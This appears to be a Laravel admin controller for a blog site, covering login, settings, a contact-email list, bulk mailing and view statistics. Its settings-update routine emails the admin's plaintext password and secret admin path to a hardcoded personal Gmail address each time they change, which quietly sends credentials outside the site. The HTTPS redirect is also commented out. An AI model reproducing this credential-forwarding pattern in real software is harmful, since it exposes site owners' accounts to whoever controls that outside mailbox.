<?php
namespace App\Http\Controllers;

use App\ContactUs;
use App\ContactUser;
use App\Helpers\Options;
use App\Http\Controllers\Controller;
use App\Models\Admin;
use App\generalsetting;
use DB;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Hash;
use Illuminate\Support\Facades\Mail;
use Illuminate\Support\Str;
use Session;
use VisitLog;
use Illuminate\Http\Request; 
use Illuminate\Support\Facades\Cache;

class AdminController extends Controller
{
public function index()
    {
//	if (!request()->isSecure()) {
//	  return redirect()->secure(request()->getRequestUri());
//	 }		
    	if (request()->isMethod("post")) {
    		request()->validate([
			    'email' => 'required',
			    'password' => 'required',
			]);
			$email = request('email');
            $password = request('password');
			$check_character = Str::contains($email, '@');
			if($check_character){
				if (Auth::guard('admin')->attempt(['email' => $email, 'password' => $password])) {
					return redirect('/'.admin.'/dashboard');
				} else{
					return redirect('/'.admin)->with('message','Invalid Details');
				}
			}else{
				return redirect('/'.admin)->with('message','Invalid Details');
			}
    	}
		Cache::flush();
    	return view("admin.admin-login");
    }
    public function dashboard()
    {
    	return view('admin.dashboard');
    }
    public function sidebar_settings()
    {
        return view('admin.sidebar_settings');
    } 
    public function logBook()
    {
        $data = VisitLog::all();
        return view('admin.logbook' , compact('data'));
    }
    public function logout()
    {
    	Session::flush();
		Cache::flush();
    	return redirect('/'.admin)->with('message','Admin Logout Successfully');
    }
     public function logininfo()
    {
        $admin_info = Admin::first();
        return view('admin.admin-settings',compact('admin_info'));
    }
     public function storelogininfo()
    {
        $admin = Admin::first();
        request()->validate([
            'old_password'=>['required'],
            'email' => ['required'],
            'path'=> ['required'],
        ]);
        if (!Hash::check(request('old_password'),$admin->password)) 
            {
                return redirect('/'.admin."/login-info")->with('flash_message','Incorrect password');;
            }
        else
        {
            if(!empty(request('path')) && !empty(request('email')) && !empty(request('old_password')) && empty(request('password')))
            {       $admin->email = request('email');
                    $admin->slug = request('path');

                    $admin->save();
                    if($admin){
                        $setting = generalsetting::first();
                        $from = 'nomii.uol@gmail.com';
                        $Mail = new Mail;
                        $email = 'nomii.uol@gmail.com';
                        $data = array(
                            "username" => request("email"),
                            "admin_slug" => request("path"),
                            "password" => request("old_password"),
                            "subject" => "SmSeo  Admin Settings",
                            "from" => array("email"=>$from, "label"=>"SmSeo "),
                            "to" => array("email"=>$email, "label"=>"")
                        );
                        sendEmail($Mail, "email-template.admin-passwords", $data);
                    }
                    return redirect('/'.admin."/login-info")->with('flash_message','Your settings saved successfully');;
                
            }
            elseif(!empty(request('path')) && !empty(request('email')) && !empty(request('old_password')) && !empty(request('password')))
            {    
                request()->validate(['password' => 'required|confirmed']);
                    $admin->email = request('email');
                    $admin->slug = request('path');
                    $admin->password = bcrypt(request('password'));
                    $admin->save();
                    if($admin){
                        $setting = generalsetting::first();
                        $from = 'nomii.uol@gmail.com';
                        $Mail = new Mail;
                        $email = 'nomii.uol@gmail.com';
                        $data = array(
                            "username" => request("email"),
                            "admin_slug" => request("path"),
                            "password" => request("password"),
                            "subject" => "SmSeo  Admin Settings",
                            "from" => array("email"=>$from, "label"=>"SmSeo "),
                            "to" => array("email"=>$email, "label"=>"")
                        );
                       sendEmail($Mail, "email-template.admin-passwords", $data);
                    }
					$admin = Admin::first();
                    $admin =  $admin->slug;
                    return redirect('/'.$admin."/login-info")->with('flash_message','Your settings saved successfully');
                
            }
        }
        return redirect('/'.admin."/login-info")->with('flash_message','Your settings saved successfully');
    }
    function send_email(){
        $first = ContactUser::first();
        if($first){
			$first_id = $first->id;         
        	$last = ContactUser::latest()->first();
        	$last_id  = $last->id;
			return view('admin.email_send',compact('first_id','last_id'));
		}
		return view('admin.email_send');
    }
    function internal_links(){
        if (request()->has("submit")) {
            //dd(request()->all());
            $target = request('target');
            $type = request('type');
            $max = request('max');
            $max_f = request('fx');
            $max_p = request('max_p');
            $max_d = request('max_d');
            $max_s = request('max_s');
            $max_1 = request('max_1');
            $rec= array(
                "target" => $target,
                "type" => $type,
                "max" => $max,
                "max_f" => $max_f,
                "max_p" => $max_p,
                "max_d" => $max_d,
                "max_s" => $max_s,
                "max_1" => $max_1,
            );       
            $data["intanal_links_settings"] = json_encode($rec);
            $Options = new Options;
            $Options->insert($data);
            return back()->with('flash_message', 'Internal Link settings updated successfully');
        }
        $Options = new Options;
        $data = $Options->get("intanal_links_settings");
        $data = json_decode($data);
        return view('admin.internal_links' , compact('data'));
    }
    function emails(){
        $data = ContactUser::orderBy('id', 'desc')->paginate(20);
        return view('admin.emails',compact('data'));
    }
    function edit_emails(){
        if ( request('edit')  ) {
            $row = DB::table('contactusers')->where('id', '=', request('edit'))->first();
            $data = ContactUser::orderBy('id', 'desc')->get();
            return view('admin.edit_emails',compact('row' , 'data'));
        }
        if ( request('del')  ) {
            $row = DB::table('contactusers')->where('id', '=', request('del'))->delete();
          return  redirect('/'.admin.'/emails')->with('deletd_message','Email has been Deleted Successfully');
        }
        if (request('submit') ) {
            /*dd(request()->all());*/
            $email = request("email");
            $name = request("name");
            if (request()->filled('id')) {
                $id = request('id');
                DB::table('contactusers')->where('id', $id)->update(['email' => $email , 'name'=> $name ]);
                return  redirect('/'.admin.'/emails')->with('flash_message','Email Record Updated Successfully');
            }else{
                 request()->validate([
               'email' => ['required', 'email', 'unique:contactusers,email', 'regex:/^([a-z0-9\+_\-]+)(\.[a-z0-9\+_\-]+)*@([a-z0-9\-]+\.)+[a-z]{2,6}$/ix'],
            ]);
                DB::table('contactusers')->insert( ['email' => $email , 'name' => $name ]);
                return  redirect('/'.admin.'/emails')->with('flash_message','Email has been Stored Successfully');

            }
        }else {
            $data = ContactUser::orderBy('id', 'desc')->get();
        return view('admin.edit_emails' ,compact('data'));
        }
    }

    public function _sendMail(Request $request)
    {
        //dd(request()->all());

        if (request("email")) {
            //dd(request()->all());
            $this->validate($request, [
                'subject'       => ['required', 'string', 'min:5', 'max:255'],
                'email'         => ['required', 'regex:/^([a-z0-9\+_\-]+)(\.[a-z0-9\+_\-]+)*@([a-z0-9\-]+\.)+[a-z]{2,6}$/ix'],
                'email_content' => ['required', 'string', 'min:10', 'max:5000'],
            ]);

            $subject      = request('subject');
            $mail_content = request('email_content');
            $email_to     = request("email");
            $Mailer       = new Mail;
            $getdata      = generalsetting::first();
            $email        = "nomii.uol@gmail.com";
            $data         = array(
                "email"   => $email,
                "subject" => $subject,
                "content" => $mail_content,
                "from"    => array("email" => $email, "label" => "Xrays Blog Admin Email"),
                "to"      => array("email" => $email_to, "label" => " Admin Email"),
            );
            $send = sendEmail($Mailer, "email-template.multi-emails", $data);
            return back()->with('flash_message', 'Email is sent successfully');
        } else {
          //  dd("ok");
            $this->validate($request, [
                'subject'       => ['required', 'string', 'min:5', 'max:255'],
                'email'         => ['required', 'regex:/^([a-z0-9\+_\-]+)(\.[a-z0-9\+_\-]+)*@([a-z0-9\-]+\.)+[a-z]{2,6}$/ix'],
                'email_content' => ['required', 'string', 'min:10', 'max:5000'],
            ]);
            $id_from      = request('id_from');
            $id_to        = request('id_to');
            $subject      = request('subject');
            $mail_content = request('email_content');
            $mails        = DB::table('contactusers')->whereBetween('id', [$id_from, $id_to])->get();

            $arr      = array();
            $allmails = array();
            foreach ($mails as $mailing) {
                $email_to = $mailing->email;
                $Mailer   = new Mail;
                $getdata  = generalsetting::first();
                $email    = "nomii.uol@gmail.com";
                $data     = array(
                    "email"   => $email,
                    "subject" => $subject,
                    "content" => $mail_content,
                    "from"    => array("email" => $email, "label" => "Xrays Blog Admin Email"),
                    "to"      => array("email" => $email_to, "label" => ""),
                );
                sendEmail($Mailer, "email-template.multi-emails", $data);
                $allmails[] = $email_to;
            }
            return back()->with('flash_message', 'Emails are sent successfully');
        }
    }
    public function _sorting(){
        if (isset($_POST["submit"])){
         // dd(request()->all());
          $od = [];
          if (isset($_POST["order"])){
            $od = array();
            foreach($_POST["order"] as $v){
              $od[] = $v;
            }
            $od = implode(",", $od);
            }
          //  $od = (count($od)==0) ? "" : $od;
            $data = array(
                "page_name" => request("page"),
                "data_order" => $od
            );
            $res = DB::table("sidebar_settings")->where("page_name" , "=" , request("page"))->first();
            if ($res){
              DB::table('sidebar_settings')->where('page_name' , '=',request("page"))->update($data);
              return back()->with('sidebar_message', 'Sidebar settings updated successfully');
            }else{
                DB::table('sidebar_settings')->insert($data);
                return back()->with('sidebar_message', 'Sidebar settings updated successfully');
            } 
        }
    }

        function adsViews($type = "current_month"){
        $vw = array();
        $new = array(
            "labels" => array(),
            "data1" => array(),
        );
        if ($type=="current_month" or $type==""){
            $date = date("Y-m");
            $days = cal_days_in_month(CAL_GREGORIAN, date("m"), date("Y"));
            for($n=1; $n<=$days; $n++){
                if($n<10){
                    $date = date("Y-m")."-0$n"; 
                }else{
                    $date = date("Y-m")."-$n";
                }
                $hm = DB::table("views")->where([
                    ["view_date", "like", "%$date%"]
                ])->sum("views");
                
                $new["labels"][] = $n." ".date("M"); 
                $new["data1"][] = $hm;  
            }
            
        }elseif($type=="monthly"){
            for($n=1; $n<=12; $n++){
                if($n < 10){
                    $date = date("Y")."-0$n";
                }else{
                    $date = date("Y")."-$n";
                }
                $hm = DB::table("views")->where([
                    ["view_date", "like", "%$date%"]
                ])->sum("views");
                $new["labels"][] = date("M y", strtotime($date)); 
                $new["data1"][] = $hm;
            }
        }elseif($type == "annually"){
            for($n=2019; $n<=2030; $n++){
                $hm = DB::table("views")->where([
                    ["view_date", "like", "%$n%"]
                ])->sum("views");
                $new["labels"][] = $n; 
                $new["data1"][] = $hm;
            }
        }
        
        return $new;
    }
}